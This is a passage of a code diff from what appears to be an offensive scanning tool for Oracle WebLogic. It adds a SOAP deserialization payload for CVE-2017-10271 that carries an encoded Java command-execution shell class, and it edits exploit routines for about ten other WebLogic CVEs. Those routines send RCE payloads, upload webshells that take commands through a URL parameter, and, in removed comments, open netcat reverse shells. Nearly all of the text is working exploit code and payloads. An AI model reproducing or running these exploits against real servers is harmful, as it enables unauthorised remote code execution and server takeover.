jb2RlAQA4KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAFd3JpdGUBAAUoW0IpVgEABWZsdXNoAQAFY2xvc2UBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAEcmVhZAEABShbQilJAQAHKFtCSUkpVgEAC3RvQnl0ZUFycmF5AQAEKClbQgEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBAA5nZXRDdXJyZW50V29yawEAHSgpTHdlYmxvZ2ljL3dvcmsvV29ya0FkYXB0ZXI7AQALZ2V0UmVzcG9uc2UBADEoKUx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXNwb25zZUltcGw7AQAWZ2V0U2VydmxldE91dHB1dFN0cmVhbQEANSgpTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2VydmxldE91dHB1dFN0cmVhbUltcGw7AQARZ2V0UmVxdWVzdEhlYWRlcnMBACwoKUx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1JlcXVlc3RIZWFkZXJzOwEAKHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvUmVxdWVzdEhlYWRlcnMBAAlnZXRIZWFkZXIBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAlzZXRIZWFkZXIBAAVwcmludAEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgAhADoAOwAAAAAABgABADwAPQABAD4AAAAvAAEAAQAAAAUqtwABsQAAAAIAPwAAAAYAAQAAABMAQAAAAAwAAQAAAAUAQQBCAAAACQBDAEQAAQA+AAAAnwAEAAMAAAAquwACWSq3AANNLLsABFm3AAUrEga4AAe2AAi2AAkstgAKLLYAC6cABE2xAAEAAAAlACgADAADAD8AAAAeAAcAAAAyAAkAMwAdADQAIQA1ACUAOAAoADYAKQA5AEAAAAAqAAQACQAcAEUARgACACkAAABHAEgAAgAAACoASQBKAAAAAAAqAEsASgABAEwAAAAHAAJoBwBNAAAJAE4ATwABAD4AAAFgAAQABwAAAIYSDbgADkwrxgAkK7YADxIQtgARmQAYBr0AElkDEhNTWQQSFFNZBSpTpwAVBr0AElkDEhVTWQQSFlNZBSpTTbgAFyy2ABi2ABlOEQQAvAg6BAM2BbsAGlm3ABs6Bi0ZBLYAHFk2BQKfABAZBhkEAxUFtgAdp//puwASWRkGtgAetwAfsEwBsAABAAAAggCDAAwAAwA/AAAALgALAAAAPQAGAD4APgA/AEkAQABQAEEAUwBCAFwAQwBpAEQAdgBGAIMARwCEAEoAQAAAAFIACAAGAH0AUABKAAEAPgBFAFEAUgACAEkAOgBTAFQAAwBQADMAVQBWAAQAUwAwAFcAWAAFAFwAJwBZAFoABgCEAAAARwBIAAEAAACGAFsASgAAAEwAAAA0AAX8ACsHAFxRBwBd/wAeAAcHAFwHAFwHAF0HAF4HAF8BBwBgAAAZ/wAMAAEHAFwAAQcATQABAGEAYgACAD4AAAA/AAAAAwAAAAGxAAAAAgA/AAAABgABAAAATwBAAAAAIAADAAAAAQBBAEIAAAAAAAEAYwBkAAEAAAABAGUAZgACAGcAAAAEAAEAaAABAGEAaQACAD4AAABJAAAABAAAAAGxAAAAAgA/AAAABgABAAAAVABAAAAAKgAEAAAAAQBBAEIAAAAAAAEAYwBkAAEAAAABAGoAawACAAAAAQBsAG0AAwBnAAAABAABAGgACABuAD0AAQA+AAABrwADAAcAAACguAAgwAAhSyq2ACLAACNMK7YAJE0stgAlTiu2ACYSJxIotgApOgQZBMYADRkEEiq2ACuZAD4rtgAmEiwSKLYAKToFGQXHAAcSLToFLBIuEi+2ADAZBbgAMToGLRkGtgAyLbYAMyy2ADQSKLYANacALhkEEja2ACuZACQrtgAmEjcSKLYAKToFK7YAJhI4Eii2ACk6BhkFGQa4ADmnAARLsQABAAAAmwCeAAwAAwA/AAAAVgAVAAAAFgAHABcADwAYABQAGQAZABoAJgAbADUAHABCAB0ARwAeAEsAIABTACEAWgAiAGAAIwBkACQAbQAlAHoAJgCHACcAlAAoAJsALACeACoAnwAuAEAAAABmAAoAQgArAFsASgAFAFoAEwBvAEoABgCHABQASQBKAAUAlAAHAEsASgAGAAcAlABwAHEAAAAPAIwAcgBzAAEAFACHAHQAdQACABkAggBZAHYAAwAmAHUAdwBKAAQAnwAAAEcASAAAAEwAAAAtAAb/ADUABQcAeAcAeQcAegcAewcAXAAA/AAVBwBc+gAk/wAqAAAAAEIHAE0AAAEAfAAAAAIAfQ==</string></void></void><void class="weblogic.utils.classloaders.ClasspathClassLoader"><void method="defineCodeGenClass"><string>superman.shells.HttpEchoShell</string><object idref="byte_arr"></object><object class="java.net.URL"/></void></void></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>')
+        self.payload_cve_2017_10271_rce = ('<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/'
+            '" xmlns:wsa="http://www.w3.org/2005/08/addressing"'
+            ' xmlns:asy="http://www.bea.com/async/AsyncResponseService">   '
+            '<soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> '
+            '<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java>'
+            '<void class="sun.misc.BASE64Decoder"><void method="decodeBuffer" id="byte_arr">'
+            '<string>yv66vgAAADIA7goAOwB+BwB/CgACAIAHAIEKAAQAfggAggoAgwCECgAEAIUKAAIAhgoAAgCHCgACAIgHAIkIAIoKAIsAjAo'
+            'AEgCNCACOCgASAI8HAJAIAJEIAJIIAJMIAJQKAJUAlgoAlQCXCgCYAJkHAJoKABoAfgoAmwCcCgAaAJ0KABoAngoAEgCfCgCgAKEHAK'
+            'IKACEAowcApAoAIwClCgCmAKcKACMAqAgAdwgAqQoAqgCrCABOCgASAKwIAFsIAK0IAK4IAK8KAKYAsAoAOgCxCgCyALMKALIAhwoAp'
+            'gC0CgC1ALYIAEMIAEkIAEsKADoAtwcAuAcAuQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZh'
+            'cmlhYmxlVGFibGUBAAR0aGlzAQAfTHN1cGVybWFuL3NoZWxscy9IdHRwRWNob1NoZWxsOwEABnVwbG9hZAEAJyhMamF2YS9sYW5nL1N'
+            '0cmluZztMamF2YS9sYW5nL1N0cmluZzspVgEAEGZpbGVPdXRwdXRTdHJlYW0BABpMamF2YS9pby9GaWxlT3V0cHV0U3RyZWFtOwEAAW'
+            'UBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAARwYXRoAQASTGphdmEvbGFuZy9TdHJpbmc7AQAEdGV4dAEADVN0YWNrTWFwVGFibGUHA'
+            'IkBAARleGVjAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAARuYW1lAQAEY21kcwEAE1tMamF2YS9sYW5n'
+            'L1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAA2J1ZgEAAltCAQADbGVuAQABSQEAA291dAEAH0xqYXZhL2lvL0J'
+            '5dGVBcnJheU91dHB1dFN0cmVhbTsBAANjbWQHAJAHAFIHALoHAFYHAJoBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS'
+            '94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsa'
+            'XphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEA'
+            'CGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI'
+            '7AQAKRXhjZXB0aW9ucwcAuwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcm'
+            'cvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3Nlc'
+            'mlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFs'
+            'L2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXI'
+            'vU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAZyZXN1bHQBAAZ0aHJlYWQBAB1Md2VibG9naWMvd29yay9FeGVjdXRlVG'
+            'hyZWFkOwEAA3JlcQEALkx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXF1ZXN0SW1wbDsBAANyZXMBAC9Md2VibG9na'
+            'WMvc2VydmxldC9pbnRlcm5hbC9TZXJ2bGV0UmVzcG9uc2VJbXBsOwEAM0x3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRP'
+            'dXRwdXRTdHJlYW1JbXBsOwEABHR5cGUHAKIHAKQHALwHAL0BAApTb3VyY2VGaWxlAQASSHR0cEVjaG9TaGVsbC5qYXZhDAA8AD0BABh'
+            'qYXZhL2lvL0ZpbGVPdXRwdXRTdHJlYW0MADwAvgEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIBAAV1dGYtOAcAvwwAwADBDADCAMMMAM'
+            'QAxQwAxgA9DADHAD0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAHb3MubmFtZQcAyAwAyQBPDADKAMsBAAN3aW4MAMwAzQEAEGphdmEvb'
+            'GFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MBAAJzaAEAAi1jBwDODADPANAMAE4A0QcA0gwA0wDUAQAdamF2YS9pby9CeXRlQXJyYXlP'
+            'dXRwdXRTdHJlYW0HALoMANUA1gwAxADXDADYANkMADwAxQcA2gwA2wDcAQAbd2VibG9naWMvd29yay9FeGVjdXRlVGhyZWFkDADdAN4'
+            'BACx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXF1ZXN0SW1wbAwA3wDgBwC8DADhAOIMAOMA5AEAAAcA5QwA5gDBDA'
+            'DnAOgBAAZ3aG9hbWkBAAVpc1Z1bAEAAm9rDADpAEQMAE4ATwcAvQwA6gC+DADrAOwHAO0MAMQAvgwAQwBEAQAdc3VwZXJtYW4vc2hlb'
+            'GxzL0h0dHBFY2hvU2hlbGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy'
+            'YW5zbGV0AQATamF2YS9pby9JbnB1dFN0cmVhbQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2x'
+            'ldEV4Y2VwdGlvbgEALXdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2VydmxldFJlc3BvbnNlSW1wbAEAMXdlYmxvZ2ljL3NlcnZsZX'
+            'QvaW50ZXJuYWwvU2VydmxldE91dHB1dFN0cmVhbUltcGwBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABNqYXZhL25ldC9VUkxEZWNvZ'
+            'GVyAQAGZGVjb2RlAQA4KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAxkZWNv'
+            'ZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAFd3JpdGUBAAUoW0IpVgEABWZsdXNoAQAFY2xvc2UBABBqYXZhL2xhbmc'
+            'vU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdm'
+            'EvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZ'
+            'TsBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0'
+            'cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAEcmVhZAEABShbQilJAQAHKFtCSUkpVgEAC3RvQnl0ZUFycmF5AQAEKClbQgE'
+            'AEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBAA5nZXRDdXJyZW50V29yawEAHS'
+            'gpTHdlYmxvZ2ljL3dvcmsvV29ya0FkYXB0ZXI7AQALZ2V0UmVzcG9uc2UBADEoKUx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1Nlc'
+            'nZsZXRSZXNwb25zZUltcGw7AQAWZ2V0U2VydmxldE91dHB1dFN0cmVhbQEANSgpTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2Vy'
+            'dmxldE91dHB1dFN0cmVhbUltcGw7AQARZ2V0UmVxdWVzdEhlYWRlcnMBACwoKUx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1JlcXV'
+            'lc3RIZWFkZXJzOwEAKHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvUmVxdWVzdEhlYWRlcnMBAAlnZXRIZWFkZXIBAAZlcXVhbHMBAB'
+            'UoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAlzZXRIZWFkZXIBAAVwcmludAEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0Z'
+            'XI7AQATamF2YS9pby9QcmludFdyaXRlcgAhADoAOwAAAAAABgABADwAPQABAD4AAAAvAAEAAQAAAAUqtwABsQAAAAIAPwAAAAYAAQAA'
+            'ABMAQAAAAAwAAQAAAAUAQQBCAAAACQBDAEQAAQA+AAAAnwAEAAMAAAAquwACWSq3AANNLLsABFm3AAUrEga4AAe2AAi2AAkstgAKLLY'
+            'AC6cABE2xAAEAAAAlACgADAADAD8AAAAeAAcAAAAyAAkAMwAdADQAIQA1ACUAOAAoADYAKQA5AEAAAAAqAAQACQAcAEUARgACACkAAA'
+            'BHAEgAAgAAACoASQBKAAAAAAAqAEsASgABAEwAAAAHAAJoBwBNAAAJAE4ATwABAD4AAAFgAAQABwAAAIYSDbgADkwrxgAkK7YADxIQt'
+            'gARmQAYBr0AElkDEhNTWQQSFFNZBSpTpwAVBr0AElkDEhVTWQQSFlNZBSpTTbgAFyy2ABi2ABlOEQQAvAg6BAM2BbsAGlm3ABs6Bi0Z'
+            'BLYAHFk2BQKfABAZBhkEAxUFtgAdp//puwASWRkGtgAetwAfsEwBsAABAAAAggCDAAwAAwA/AAAALgALAAAAPQAGAD4APgA/AEkAQAB'
+            'QAEEAUwBCAFwAQwBpAEQAdgBGAIMARwCEAEoAQAAAAFIACAAGAH0AUABKAAEAPgBFAFEAUgACAEkAOgBTAFQAAwBQADMAVQBWAAQAUw'
+            'AwAFcAWAAFAFwAJwBZAFoABgCEAAAARwBIAAEAAACGAFsASgAAAEwAAAA0AAX8ACsHAFxRBwBd/wAeAAcHAFwHAFwHAF0HAF4HAF8BB'
+            'wBgAAAZ/wAMAAEHAFwAAQcATQABAGEAYgACAD4AAAA/AAAAAwAAAAGxAAAAAgA/AAAABgABAAAATwBAAAAAIAADAAAAAQBBAEIAAAAA'
+            'AAEAYwBkAAEAAAABAGUAZgACAGcAAAAEAAEAaAABAGEAaQACAD4AAABJAAAABAAAAAGxAAAAAgA/AAAABgABAAAAVABAAAAAKgAEAAA'
+            'AAQBBAEIAAAAAAAEAYwBkAAEAAAABAGoAawACAAAAAQBsAG0AAwBnAAAABAABAGgACABuAD0AAQA+AAABrwADAAcAAACguAAgwAAhSy'
+            'q2ACLAACNMK7YAJE0stgAlTiu2ACYSJxIotgApOgQZBMYADRkEEiq2ACuZAD4rtgAmEiwSKLYAKToFGQXHAAcSLToFLBIuEi+2ADAZB'
+            'bgAMToGLRkGtgAyLbYAMyy2ADQSKLYANacALhkEEja2ACuZACQrtgAmEjcSKLYAKToFK7YAJhI4Eii2ACk6BhkFGQa4ADmnAARLsQAB'
+            'AAAAmwCeAAwAAwA/AAAAVgAVAAAAFgAHABcADwAYABQAGQAZABoAJgAbADUAHABCAB0ARwAeAEsAIABTACEAWgAiAGAAIwBkACQAbQA'
+            'lAHoAJgCHACcAlAAoAJsALACeACoAnwAuAEAAAABmAAoAQgArAFsASgAFAFoAEwBvAEoABgCHABQASQBKAAUAlAAHAEsASgAGAAcAlA'
+            'BwAHEAAAAPAIwAcgBzAAEAFACHAHQAdQACABkAggBZAHYAAwAmAHUAdwBKAAQAnwAAAEcASAAAAEwAAAAtAAb/ADUABQcAeAcAeQcAe'
+            'gcAewcAXAAA/AAVBwBc+gAk/wAqAAAAAEIHAE0AAAEAfAAAAAIAfQ=='
+            '</string></void></void><void class="weblogic.utils.classloaders.ClasspathClassLoader">'
+            '<void method="defineCodeGenClass"><string>superman.shells.HttpEchoShell</string><object idref="byte_arr">'
+            '</object><object class="java.net.URL"/></void></void></java></work:WorkContext></soapenv:Header>'
+            '<soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>')
         self.payload_cve_2017_10271_upload = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><' \
             'soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version' \
             '="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminServer' \
@@ -13424,6 +13838,7 @@ class OracleWeblogic():
 
     # 2020-09-17 complete.
     def cve_2014_4210(self):
+        self.threadLock.acquire()
         self.pocname = "Oracle Weblogic: CVE-2014-4210"
         self.method = "get"
         self.path = "/uddiexplorer/"
@@ -13443,8 +13858,10 @@ class OracleWeblogic():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def cve_2017_3506(self):
+        self.threadLock.acquire()
         self.pocname = "Oracle Weblogic: CVE-2017-3506"
         self.info = color.upload()
         self.rawdata = "null"
@@ -13472,9 +13889,11 @@ class OracleWeblogic():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     # 2020-09-17 complete. support nc shell
     def cve_2017_10271(self):
+        self.threadLock.acquire()
         self.pocname = "Oracle Weblogic: CVE-2017-10271"
         self.info = color.derce() + " [nc shell]"
         self.path = "/wls-wsat/CoordinatorPortType"
@@ -13491,7 +13910,7 @@ class OracleWeblogic():
         self.headers_rce = {
             'Content-type': 'text/xml',
             'type': 'exec',
-            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
+            'User-Agent': USER_AGENT,
             'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
             'Connection': 'keep-alive',
             'cmd': CMD
@@ -13526,34 +13945,16 @@ class OracleWeblogic():
                 self.request = requests.get(self.shellpath, headers=self.headers, timeout=TIMEOUT, verify=False)
                 self.r = "Upload Webshell: " + self.shellpath + "\n-------------------------\n" + self.request.text
                 verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
-#                self.request = requests.post(self.url + self.path, data=self.poc, headers=self.headers, 
-#                    timeout=TIMEOUT, verify=False)
-#                self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-#                self.shellpath = self.url+"/bea_wls_internal/"+self.filename
-#                self.request = requests.get(self.shellpath, headers=self.headers, timeout=TIMEOUT, verify=False)
-#                verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
-#            else:
-
-#                if CMD == "nc":
-#                    self.ncip = input(now.timed(de=DELAY)+color.green("[+] Nc host(ip): "))
-#                    self.ncport = input(now.timed(de=DELAY)+color.green("[+] Nc port: "))
-#                    self.nc = self.weblogic_nc.replace("REIP", self.ncip).replace("REPORT", self.ncport)
-#                    self.request = requests.post(self.url+"/wls-wsat/CoordinatorPortType", data=self.nc, 
-#                        headers=self.headers, timeout=TIMEOUT, verify=False)
-#                    if self.request.status_code == 500:
-#                        self.r = "NC-Succes"
-#                        verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
-#                    else:
-#                        self.r = "NC-Failed"
-#                        verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def cve_2018_2894(self):
+        self.threadLock.acquire()
         self.pocname = "Oracle Weblogic: CVE-2018-2894"
         self.info = color.deupload()
         self.payload1 = "/ws_utc/resources/setting/options/general"
@@ -13578,11 +13979,11 @@ class OracleWeblogic():
         }
         self.headers = {
             'Accept': 'text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'User-agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
+            'User-agent': USER_AGENT
         }
         try:
             if VULN is None:
-                self.request = requests.get(self.url+self.payload1, headers=headers, timeout=TIMEOUT, verify=False)
+                self.request = requests.get(self.url+self.payload1, headers=HEADERS, timeout=TIMEOUT, verify=False)
                 self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                 if self.request.status_code == 200 and r"BasicConfigOptions" in self.request.text:
                     self.r = "PoCSuCCeSS"
@@ -13597,7 +13998,7 @@ class OracleWeblogic():
                 self.match = re.findall("<id>(.*?)</id>", self.request.text)
                 self.tid = self.match[-1]
                 self.shellpath = self.url+"/ws_utc/css/config/keystore/"+str(self.tid)+"_"+self.filename
-                self.request = requests.get(self.shellpath, headers=headers, timeout=TIMEOUT, verify=False)
+                self.request = requests.get(self.shellpath, headers=HEADERS, timeout=TIMEOUT, verify=False)
                 self.request = requests.get(self.shellpath+"?pwd=password&cmd="+CMD, headers=self.headers, 
                     timeout=TIMEOUT, verify=False)
                 self.r = "Upload Webshell: "+self.shellpath+"\n-------------------------\n"+self.request.text
@@ -13608,8 +14009,10 @@ class OracleWeblogic():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def cve_2019_2725(self):
+        self.threadLock.acquire()
         self.pocname = "Oracle Weblogic: CVE-2019-2725"
         self.info = color.derce() + " [nc shell]"
         self.payload_path = "/_async/AsyncResponseService"
@@ -13621,19 +14024,19 @@ class OracleWeblogic():
         
         self.headers = {
             'Accept': 'text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'User-agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
+            'User-agent': USER_AGENT,
             'content-type': 'text/xml'
         }
         self.headers_rce = {
             'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
-            'User-agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
+            'User-agent': USER_AGENT,
             'content-type': 'text/xml',
             'cmd': CMD
         }
         try:
             #if VULN is None:
             # Check Weblogic Version is 10xx or 12xx
-            self.request = requests.get(self.url + "/console", headers=headers, timeout=TIMEOUT, verify=False)
+            self.request = requests.get(self.url + "/console", headers=HEADERS, timeout=TIMEOUT, verify=False)
             self.v = re.findall("WebLogic Server Version: (.*?)</p>", self.request.text)[0]
             if r"10" in self.v:
                 self.payload = self.payload_cve_2019_2725_rce_10
@@ -13688,8 +14091,10 @@ class OracleWeblogic():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
-            
+        self.threadLock.release()
+
     def cve_2019_2729(self):
+        self.threadLock.acquire()
         self.pocname = "Oracle Weblogic: CVE-2019-2729"
         self.info = color.derce() + " [nc shell]"
         self.path = "/wls-wsat/CoordinatorPortType"
@@ -13697,11 +14102,10 @@ class OracleWeblogic():
         self.r = "PoCWating"
         self.method = "post"
         self.headers = {
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+            'user-agent': USER_AGENT,
             'content-type': 'text/xml',
             'type': 'exec',
             'Connection': 'Keep-Alive',
-            'User-Agent': 'Java1.8.0_211',
             'cmd': CMD
         }
         try:
@@ -13731,8 +14135,10 @@ class OracleWeblogic():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def cve_2020_2551(self):
+        self.threadLock.acquire()
         self.pocname = "Oracle Weblogic: CVE-2020-2551"
         self.info = color.derce()
         self.path = "/wls-wsat/CoordinatorPortType"
@@ -13757,9 +14163,11 @@ class OracleWeblogic():
             verify.timeout_output(self.pocname)
         except Exception as error:
             verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
-    
+        self.threadLock.release()
+
     # 2020-11-05 
     def cve_2020_2555(self):
+        self.threadLock.acquire()
         self.pocname = "Oracle Weblogic: CVE-2020-2555"
         self.info = color.derce()
         self.method = "giop"
@@ -13767,7 +14175,7 @@ class OracleWeblogic():
         self.r = "PoCWating"
         try:
             if VULN is None:
-                self.request = requests.get(self.url + "/console", headers=headers, timeout=TIMEOUT, verify=False)
+                self.request = requests.get(self.url + "/console", headers=HEADERS, timeout=TIMEOUT, verify=False)
                 self.v = re.findall("WebLogic Server Version: (.*?)</p>", self.request.text)[0]
                 self.vuln_v = ['3.7.1.17','12.1.3.0.0','12.2.1.3.0','12.2.1.4.0']
                 if self.v in self.vuln_v:
@@ -13853,9 +14261,11 @@ class OracleWeblogic():
             verify.timeout_output(self.pocname)
         except Exception as error:
             verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     # 2020-11-06
     def cve_2020_2883(self):
+        self.threadLock.acquire()
         self.pocname = "Oracle Weblogic: CVE-2020-2883"
         self.info = color.derce()
         self.method = "giop"
@@ -13863,7 +14273,7 @@ class OracleWeblogic():
         self.r = "PoCWating"
         try:
             if VULN is None:
-                self.request = requests.get(self.url + "/console", headers=headers, timeout=TIMEOUT, verify=False)
+                self.request = requests.get(self.url + "/console", headers=HEADERS, timeout=TIMEOUT, verify=False)
                 self.v = re.findall("WebLogic Server Version: (.*?)</p>", self.request.text)[0]
                 self.vuln_v = ['10.3.6.0.0','12.1.3.0.0','12.2.1.3.0','12.2.1.4.0']
                 if self.v in self.vuln_v:
@@ -13901,16 +14311,18 @@ class OracleWeblogic():
             verify.timeout_output(self.pocname)
         except Exception as error:
             verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def cve_2020_14882(self):
+        self.threadLock.acquire()
         self.pocname = "Oracle WebLogic: CVE-2020-14882"
         self.info = color.rce()
         self.method = "post"
         self.rawdata = "null"
         self.payload = self.payload_cve_2020_14882_v12
-        self.path = "/console/css/%252e%252e%252fconsole.portal"
-        self.headers = {
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+        self.path = self.url + "/console/css/%252e%252e%252fconsole.portal"
+        self.headers_14882 = {
+        'User-Agent': USER_AGENT,
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'
                   'application/signed-exchange;v=b3;q=0.9',
         'Accept-Encoding': 'gzip, deflate',
@@ -13920,10 +14332,7 @@ class OracleWeblogic():
         'cmd': CMD
         }
         try:
-            self.request = requests.post(self.url + self.path, data=self.payload, headers=self.headers,
-                                         timeout=TIMEOUT, verify=False)
-            #self.request = requests.post(self.url + self.path, data=self.payload, headers=self.headers,
-            #                             timeout=TIMEOUT, verify=False)
+            self.request = requests.post(self.path, data=self.payload, headers=self.headers_14882, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
